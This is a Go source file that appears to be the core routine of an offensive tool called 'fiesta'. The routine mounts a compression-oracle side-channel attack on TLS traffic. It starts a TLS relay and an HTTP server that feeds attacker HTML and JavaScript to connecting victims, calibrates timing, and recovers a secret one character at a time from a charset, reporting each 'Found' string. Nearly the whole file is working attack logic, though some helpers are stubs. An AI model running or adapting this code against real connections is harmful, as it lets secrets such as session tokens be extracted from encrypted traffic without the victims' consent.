package core

import (
	"bufio"
	"errors"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/The-Cracker-Technology/fiesta/pkg/httpipe"
	"github.com/The-Cracker-Technology/fiesta/pkg/tlsrelay"
)

// TODO
func (c *Core) exploit() {
	var e error

	// Load charset candidates
	e = c.loadCharset()
	if !c.running { // exit if stoped
		return
	}
	if e != nil { // exit if error
		c.error <- e
		return
	}

	// Create relay server
	e = c.startTLSrelay()
	if !c.running { // exit if stoped
		return
	}
	if e != nil { // exit if error
		c.error <- e
		return
	}
	c.sendIfOpen(c.status, "TLS Relay server started")

	// Create http pipe proxy
	e = c.startHTTPipe()
	if !c.running { // exit if stoped
		return
	}
	if e != nil { // exit if error
		c.error <- e
		return
	}
	c.sendIfOpen(c.status, "Control HTTP server started")

	// Wait until we receive a connection
	c.sendIfOpen(c.status, "Waiting for connections")
	for c.pipe.HowManyWS() == 0 {
		time.Sleep(time.Second)
	}
	c.sendIfOpen(c.status, "Connection received. FIESTAAAA!")

	// Calculate connection ordes and size
	c.sendIfOpen(c.status, "Finding Oracles")
	e = c.findOracle()
	if !c.running { // exit if stoped
		return
	}
	if e != nil { // exit if error
		c.error <- e
		return
	}

	// Calculate how much wait is needed for loading
	c.sendIfOpen(c.status, "Automatic Speed Calibration")
	e = c.findWait()
	if !c.running { // exit if stoped
		return
	}
	if e != nil { // exit if error
		c.error <- e
		return
	}
	c.sendIfOpen(c.status, "Timeout between connections: "+c.timeoutConn.String())
	c.sendIfOpen(c.status, "Timeout between guesses: "+c.timeout.String())

	// Search data
	c.sendIfOpen(c.status, "Searching... please be patient")
	e = c.search()
	if !c.running { // exit if stoped
		return
	}
	if e != nil { // exit if error
		c.error <- e
		return
	}

	// End exploit
	c.Break()
}

func (c *Core) loadCharset() error {
	ch := c.option["CHARSET"]
	if !strings.HasPrefix(ch, "file:") {
		// it's a string, not a file
		for _, x := range ch {
			c.charset = append(c.charset, string(x))
		}
		return nil
	}

	// it's a file
	file, e := os.Open(ch[5:])
	if e != nil {
		return e
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		t := scanner.Text()
		c.charset = append(c.charset, t)
	}

	e = scanner.Err()
	if e != nil {
		return e
	}

	return nil
}

func (c *Core) startTLSrelay() error {
	proxyHost, okProxyHost := c.option["PROXYHOST"]
	proxyPort, okProxyPort := c.option["PROXYPORT"]
	if !okProxyHost || !okProxyPort {
		return errors.New("missing parameters in TLSrelay")
	}

	i, e := strconv.Atoi(proxyPort)
	if e != nil {
		return errors.New("TLSrelay listening port is not a number")
	}

	c.relay = tlsrelay.NewTLSRelay()
	e = c.relay.SetListen(proxyHost, i)
	if e != nil {
		return e
	}

	relayHost, okRelayHost := c.option["RELAYHOST"]
	relayPort, okRelayPort := c.option["RELAYPORT"]
	if okRelayHost && okRelayPort {
		i, e := strconv.Atoi(relayPort)
		if e != nil {
			return errors.New("TLSrelay listening port is not a number")
		}

		e = c.relay.SetRelay(relayHost, i)
		if e != nil {
			return e
		}
	}

	go c.relay.Start()
	return nil
}

func (c *Core) startHTTPipe() error {
	srvHost, okSrvHost := c.option["SRVHOST"]
	srvPort, okSrvPort := c.option["SRVPORT"]
	if !okSrvHost || !okSrvPort {
		return errors.New("missing parameters in HTTPipe")
	}

	_, e := strconv.Atoi(srvPort)
	if e != nil {
		return errors.New("HTTPipe listening port is not a number")
	}

	c.pipe = httpipe.NewHTTPipe()
	c.pipe.StartBackground(srvHost + ":" + srvPort)

	c.pipe.ChangeDefault(c.htmlContent())
	c.pipe.ChangeJS(c.jsContent())

	return nil
}

func (c *Core) findOracle() error {
	c.minSize = 0
	c.connN = 0
	return nil
}

func (c *Core) findWait() error {
	right := c.option["SEARCH"]
	wrong := right + c.option["WRONG"]

	retries := 0
	maxRetries := 3

	// Get Oracle waiting a lot of time
	var oRight, oWrong int
	c.timeoutConn = time.Millisecond * 3000
	c.timeout = c.timeoutConn * 3
	for {
		oRightNow, eRight := c.guess(right)
		oWrongNow, eWrong := c.guess(wrong)
		if eRight != nil {
			return eRight
		}
		if eWrong != nil {
			return eWrong
		}

		if oRightNow == oRight && oWrongNow == oWrong {
			break
		}

		oRight = oRightNow
		oWrong = oWrongNow
	}

	c.timeoutConn = time.Millisecond * 100
	retries = 0
outer:
	for {
	inner:
		for {
			o, e := c.guess(right)
			if e != nil {
				break inner
			}

			decision, _ := c.makeDecision(oRight, oWrong, map[string]int{"a": o})
			if len(decision) != 1 {
				break inner
			}

			o, e = c.guess(wrong)
			if e != nil {
				break inner
			}

			decision, _ = c.makeDecision(oRight, oWrong, map[string]int{"a": o})
			if len(decision) != 0 {
				break inner
			}

			if retries < maxRetries {
				retries++
				continue inner
			}
			break outer
		}

		retries = 0
		c.timeoutConn += time.Millisecond * 100
		time.Sleep(time.Second)
	}

	c.timeoutConn = c.timeoutConn * 2
	c.timeout = c.timeoutConn * 3
	return nil
}

func (c *Core) search() error {
	var candidateRight, candidateLeft, found []string
	first := c.option["SEARCH"]
	candidateRight = c.push([]string{}, first)

	// while still candidates
	for len(candidateRight) > 0 || len(candidateLeft) > 0 {
		var next string
		before := (len(candidateLeft) > 0)

		// left guessing has priority
		if before {
			candidateLeft, next = c.pop(candidateLeft)
		} else {
			candidateRight, next = c.pop(candidateRight)
		}

		// baseline: right and wrong guesses
		rightGuess := next
		wrongGuess := next + c.option["WRONG"]

		// get oracle for them
		var right, wrong int
		var e error
		for i := 0; i < 3; i++ {
			right, e = c.guess(rightGuess)
			if e != nil {
				return e
			}
			wrong, e = c.guess(wrongGuess)
			if e != nil {
				return e
			}

			// If right and wrong are equal, we got an error before this point
			if right == wrong {
				// maybe the previous was the correct one
				if before {
					candidateLeft = c.push(candidateLeft, rightGuess[1:])
				} else {
					candidateRight = c.push(candidateRight, rightGuess[:len(rightGuess)-1])
				}
				continue
			}
		}
		c.sendIfOpen(c.out, rightGuess)

		results := make(map[string]int)
		for _, g := range c.charset {
			if before {
				g = g + next
			} else {
				g = next + g
			}

			oracle, e := c.guess(g)
			if e != nil {
				return e
			}

			results[g] = oracle
		}

		o, e := c.makeDecision(right, wrong, results) // wrapper
		if e != nil {
			return e
		}
		if len(o) > 0 {
			for _, g := range o {
				// double check
				oracle, e := c.guess(g)
				if e != nil {
					return e
				}
				o, _ := c.makeDecision(right, wrong, map[string]int{"g": oracle})
				if len(o) != 1 {
					continue // we did a wrong guess
				}

				if before {
					candidateLeft = c.push(candidateLeft, g)
				} else {
					candidateRight = c.push(candidateRight, g)
				}
			}
			continue
		}

		if before {
			if !c.verifyFinding(next) {
				continue
			}
			// verify "next" is a finding
			found = append(found, next)
			msg := "Found: " + next
			c.result <- msg
		} else {
			// find left now
			candidateLeft = c.push(candidateLeft, next)
		}

	}

	return nil
}

func (c *Core) verifyFinding(candidate string) bool {
	return true
}
